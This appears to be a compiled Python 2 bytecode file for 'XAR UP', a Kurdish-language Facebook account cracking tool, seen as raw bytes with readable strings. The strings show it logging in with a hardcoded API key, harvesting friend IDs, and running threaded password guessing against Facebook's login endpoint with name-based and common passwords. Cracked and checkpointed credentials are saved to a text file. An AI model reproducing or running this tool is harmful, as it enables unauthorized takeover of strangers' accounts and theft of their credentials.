ó
 ÿc           @   s±  e  Z e r# d  d  Z   Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d d l m Z d GHe j d  e e  e j d  e j   Z e j e   e j e j j   d	 d
 d d f g e _ d   Z d   Z d   Z  d   Z! d Z" d   Z# d  Z$ g  Z% g  a& g  a' g  Z( g  Z) d Z* d Z+ e j d  d GHd Z, e, GHd Z- d Z. d Z/ xv e/ d k rie0 d  Z1 e1 e- k r\e0 d  Z2 e2 e. k rOd e1 GHe j3 d  d Z/ n
 d GHd  GHn
 d! GHd" GHqôWd#   Z4 d$   Z5 d%   Z6 d&   Z7 d'   Z8 e9 d( k r­e4   n  d S()   i    iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsers   NS XARt   cleart   utf8t   max_timei   s
   User-Agents³   Mozilla/5.0 (Linux; Android 9; FIG-LA1 Build/HUAWEIFIG-LA1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 GSA/10.90.16.21.arm64 c           C   s   d GHt  j j   d  S(   Ns   [1;96mð¯ Chwna Darawa(   t   ost   syst   exit(    (    (    s   991140843o.pyt   kelwa   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   991140843o.pyt   acak   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR
   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   991140843o.pyR   '   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   991140843o.pyt   anime1   s    s»   
 __   __          _____  
 \ \ / /    /\   |  __ \ 
  \ V /    /  \  | |__) |
   > <    / /\ \ |  _  / 
  / . \  / ____ \| | \ \ 
 /_/ \_\/_/    \_\_|  \_                         
[92m
c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [1;95mPleas wait [1;95mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   991140843o.pyt   tikC   s
      s   [31mNot Vulns	   [32mVulns%   
[33m_________NS XAR__________
[33ms¡   
 __   __          _____  
 \ \ / /    /\   |  __ \ 
  \ V /    /  \  | |__) |
   > <    / /\ \ |  _  / 
  / . \  / ____ \| | \ \ 
 /_/ \_\/_/    \_\_|  \_[33m
t   xart   upt   trues    [33m [33mUSERNAME [33m>>[33ms   [33m[33mPASS [33m>> [33ms   LOGGING BY UserName i   t   falses   [1;96mYOUR PASSWORD IS WRONGs   YOUR PASSWORD IS WRONGs   [1;96mUSERNAME IS WRONGs   USERNAME IS WRONGc          C   sº  t  j d  y t d d  }  t   Wnt t f k
 rµt  j d  t GHd d GHd GHd GHt d  } t d	  } t   y t	 j d
  Wn  t
 j k
 r´ d GHt   n Xt t	 j _ t	 j d d  | t	 j d <| t	 j d <t	 j   t	 j   } d | k rWy!d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d  6| d 6d! d" 6d# d$ 6} t j d%  } | j |  | j   } | j i | d& 6 d' } t j | d( | } t j | j  }	 t d d)  }
 |
 j |	 d*  |
 j   d+ GHt j d, |	 d*  t   WqWt j  j! k
 rSd- GHt   qWXn  d. | k rd/ GHt  j d0  t" j# d1  t   q¶d2 GHt  j d0  t" j# d1  t$   n Xd  S(3   NR   s	   login.txtt   ri*   s   [1;96m=s   ââTKAEA FB DAXL KA s8   [31;1m<-------------$[36;1mLOGIN[31;1m$------------->s%   [35;1m[ð¡]Â¤EMAIL/IDÂ¤â¤> [37;1ms+   [35;1m[âââ ]Â¤PASSWORDÂ¤â¡> [31;1m s   https://m.facebook.coms*   
[31;1m Tkaea Paewande bbasta ba intarnitt   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens   
[92m[â]Login  SUCCESFULLYsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s$   
[31;1m[!]There is no connection[!]t
   checkpoints8   
[91m[!] Bbwra Am Account La Checkpointa Bakar Nayat[!]s   rm -rf login.txti   s&   
[9Qm[Â¿]Email w Passwordt Halaya[Â¿](%   R   t   systemt   opent   menut   KeyErrort   IOErrort   logot	   raw_inputR%   t   brt	   mechanizet   URLErrorR	   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postt
   exceptionsR   R   R   t   login(   t   tokett   idt   pwdt   urlR>   t   dataR   t   aR*   R    t   unikers(    (    s   991140843o.pyR_   t   sj    	
S

c          C   s¬  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n Xyv t j	 d |   } t
 j | j  } | d } | d	 } t j	 d
 |   } t
 j | j  } t | d d  } Wnf t k
 r)t  j d  d GHt  j d  t j d  t   n# t j j k
 rKd GHt   n Xt  j d  t GHd GHd | GHd | GHd | GHd GHd GHd GHd GHd GHd GHd GHt   d  S(   NR   s	   login.txtR*   s)   [[31;1m[â¤] Bbwra Token Ka Halaya [â¤]s   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameRa   s7   https://graph.facebook.com/me/subscribers?access_token=t   summaryt   total_counts"   [1;91m Account Kat La checkpointas&   [1;92mThere is no internet connections   ~~~~~~~~~~~~~~~~~~~~~~~~s   [33mXARÃUP/ Name >>s   [33mXARÃUP/ ID >>s   [33mXARÃUP/ TotalSub >>R   s   ====================s!   [33m[1]> Dast Pe Krdn Ba Hack FBs   [33m[2]> Bo Update Krdna Was   [33m[0]> Chuna Darawa(   R   RB   RC   t   readRF   R   R   R_   RW   RX   RY   RZ   R[   R   RE   R^   R   R	   RG   t   option(   R`   t   otwRe   t   namefbRa   t   otsR   t   subid(    (    s   991140843o.pyRD   ­   sP    


			c          C   s²   t  d  }  |  d k r' d GHt   n |  d k r= t   nq |  d k ru t j d  t GHt d  t j d  n9 |  d	 k r¢ t d
  t j d  t   n d GHt   d  S(   Ns   
[31;1mXAR[37;1mUP>>[33;1mR   s#   [31;1m[!]Tkaya Ba Batali Je MahelaR4   t   2R   s.   <<<<<<<<PREPARE TO â¡ââ¡UPDATE TOOL >>>>>>s   bash update.shR:   s   LOGIN OUT ACCOUNT PLEASE WAITs   rm -rf login.txts!   [31;1m Tkaya Shte Sarbaxo Manwsa(   RH   Rk   t   graberR   RB   RG   R"   R	   (   Rf   (    (    s   991140843o.pyRk   Ù   s"    




c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHt
   d  S(
   NR   s	   login.txtR*   s%   [31;1mToken Halaya Tkaya Daxl Barawas   rm -rf login.txti   s'   [92m{1}~~Hack Krdn La Regay Friend wa s9   [92m{2}~~Hack Krdn La Regay ID Xallkawa Frindyan Zoor Bes   [92m{0}~~Chwna Darawa(   R   RB   RC   Rj   R`   RF   R   R   R_   RG   t	   startgrab(    (    (    s   991140843o.pyRq   í   s    c          C   sä  t  d  }  |  d k r' d GHt   n|  d k r¢ t j d  t GHd GHt d  t j d t  } t	 j
 | j  } x:| d	 D] } t j | d
  q Wn|  d k rt j d  t GHt  d  } d GHy> t j d | d t  } t	 j
 | j  } d | d GHWn' t k
 r8d GHt  d  t   n Xd GHt j d | d t  } t	 j
 | j  } xH | d	 D] } t j | d
  qvWn" |  d k rªt   n d GHt   d t t t   GHt d  d d d d d g } x0 | D]( }	 d |	 Gt j j   t j d   qñWd! GHd" GHt d#  d$ GHd%   }
 t d&  } | j |
 t  t d'  d( GHd) t t t   d* t t t   GHd GHt GHt d+  t d,  t d-  t d,  d GHd GHt  d.  t   d  S(/   Ns	   XAR+UP>> R   s    [1;91mTkaya Ba Batale Je MahelaR4   R   t   ________XAR____UPs   [1;91mDUMP ALL ID [1;91m...s3   https://graph.facebook.com/me/friends?access_token=Rd   Ra   Rp   s   [â¤] ID XALK DANE>>>t   _______XAR____UPs   https://graph.facebook.com/s   ?access_token=s   XAR/ Name :  Rg   s   [33mTKAYA ID DIKA BAKAR BINAs   [GARANAWA]Enter Bkas   [32;1mDUMP ID ....s   /friends?access_token=R:   s+   [1;91mTkaya Boshayaka Ba Jwane Pr Bkara was   [32;1m[â¡]ALL ID >>s%   PLEAS WAIT ....................START.s   .   s   ..  s   ... s   ....s   .....s   [37;1m[â]Crackingi   s1   
                            [33m______XAR____UPs      [33m______NS XAR___s0             [33m  CRACKING START PLEAS WAIT..... s     [33m______NS XAR____c         S   sQ  |  } y t  j d  Wn t k
 r* n Xyt j d | d t  } t j | j  } | d d } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d GHd | d GHd | GHd | d GHt j | |  n2
d | d k rd GHd | d GHd | GHd | d GHt d d  }	 |	 j d | d | d  |	 j   t j | |  n°	| d d }
 t	 j
 d | d |
 d  } t j |  } d	 | k rGt j d | d
 | d	  } t j | j  } d GHd | d GHd | GHd |
 d GHt j | |
  nûd | d k rÉd GHd | d GHd | GHd |
 d GHt d d  }	 |	 j d | d  |
 d  |	 j   t j | |
  ny| d d! } t	 j
 d | d | d  } t j |  } d	 | k r~t j d | d
 | d	  } t j | j  } d GHd" | d GHd | GHd | d GHt j | |  nÄd | d k r d# GHd$ | d GHd% | GHd& | d GHt d d  }	 |	 j d | d  | d  |	 j   t j | |  nB| d d' } t	 j
 d | d | d  } t j |  } d	 | k rµt j d | d
 | d	  } t j | j  } d( GHd) | d GHd* | GHd+ | d GHt j | |  nd | d k r7d# GHd$ | d GHd% | GHd& | d GHt d d  }	 |	 j d | d  | d  |	 j   t j | |  n| d d, } t	 j
 d | d | d  } t j |  } d	 | k rìt j d | d
 | d	  } t j | j  } d( GHd) | d GHd* | GHd+ | d GHt j | |  nVd | d k rnd# GHd$ | d GHd% | GHd& | d GHt d d  }	 |	 j d | d  | d  |	 j   t j | |  nÔd- } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d( GHd) | d GHd* | GHd+ | d GHt j | |  n'd | d k rd# GHd$ | d GHd% | GHd& | d GHt d d  }	 |	 j d | d  | d  |	 j   t j | |  n¥| d d. } t	 j
 d | d | d  } t j |  } d	 | k rRt j d | d
 | d	  } t j | j  } d( GHd) | d GHd* | GHd+ | d GHt j | |  nðd | d k rÔd# GHd$ | d GHd% | GHd& | d GHt d d  }	 |	 j d | d/ | d  |	 j   t j | |  nn| d0 d } t	 j
 d | d | d  } t j |  } d	 | k r	t j d | d
 | d	  } t j | j  } d( GHd) | d GHd% | GHd+ | d GHt j | |  n¹d | d k r
d# GHd) | d GHd% | GHd& | d GHt d d  }	 |	 j d | d/ | d  |	 j   t j | |  n7| d0 d1 } t	 j
 d | d | d  } t j |  } d	 | k rÀ
t j d | d
 | d	  } t j | j  } d( GHd) | d GHd* | GHd+ | d GHt j | |  n d | d k rBd# GHd$ | d GHd% | GHd& | d GHt d d  }	 |	 j d | d/ | d  |	 j   t j | |  n  Wn n Xd  S(2   Nt   Grabers   https://graph.facebook.com/s   /?access_token=t
   first_namet   12345s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R@   s   ?access_token=s   [92m OKs   [92m[Â©]NAME >>> Rg   s   [92m[Â©]ID >>>s   [92m[Â©]PASS >>>s   
s   www.facebook.comt	   error_msgs   [91mCPs   [91mNAME >>> s   [91mID >>> s   [91mPASS>>> s   Graber/Id_pass.txtRe   s   ID:s
    Password:t   543221s   [91mNAME>>> s
   [92mID>>>s   [92mPASS>>>s   Graber/id_pass.txts    Pass:t   3344s   [92mNAME >>> s    [37;1mAccountaka La Checkpointas   [37;1m NAWE >>> s   [37;1mID kay >>> s   [37;1mPASSWORD kay >>> t   123456s   [37;1m Hack Bu Akretawas   [37;1mNAWE >>> s   [37;1mID kay >>>s   [37;1mPASSWORD kay >>>s   654321 t
   1122334455t
   1234512345s    Pw:t	   last_namet   344321(   R   t   mkdirt   OSErrorRW   RX   R`   RY   RZ   R[   t   urllibt   urlopent   loadt   okst   appendRC   R   R\   t   cekpoint(   t   argt   userRe   R   t   pass1Rd   t   qR   R    t   cekt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7t   pass8t   pass9(    (    s   991140843o.pyt   main.  s|   		
		
		
		
		
		
		
		
		
i   s@   [32;1m>>>>>>>>>>>>>>>[31;1mXar[37;1mXar[32;1m<<<<<<<<<<<<<<<s)   [32;1m Crack Krdnaka Kotay Hat [â]^_^ s4   [31;1mKoy Hack Bu/[31;1mCHECKPOINT[37;1m: [32;1ms   [31;1m/[33;1ms%   [37;1mââââââââââs   ==========XAWAN TOOL==========s   NS XARs(   
[31;1m [Bo Dwbara Krdnawa]=> enter bka(   RH   Rr   R   RB   RG   R"   RW   RX   R`   RY   RZ   R[   Ra   R   RE   Rq   RD   R   R   R   R   R   R   R   R    t   mapR   R   (   t   peakR*   R    t   st   idtt   jokt   opR   R#   R$   R   t   p(    (    s   991140843o.pyRr   þ   s|    




  
	Ö
)




t   __main__(:   t   Falset   foot   barR   R   R   t   datetimeR   RS   t   ret	   threadingRY   R   t	   cookielibRW   RJ   t   multiprocessing.poolR    t   requests.exceptionsR   R   RB   t   reloadt   setdefaultencodingRI   t   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR	   R   R   R"   RG   R%   t   backt   berhasilR   R   Ra   t   listgrupt   vulnott   vulnt   RHt   CorrectUsernamet   CorrectPasswordt   loopRH   t   usernameR0   R   R_   RD   Rk   Rq   Rr   t   __name__(    (    (    s   991140843o.pyt   <module>   sp   

			
		
				9	,			ÿ 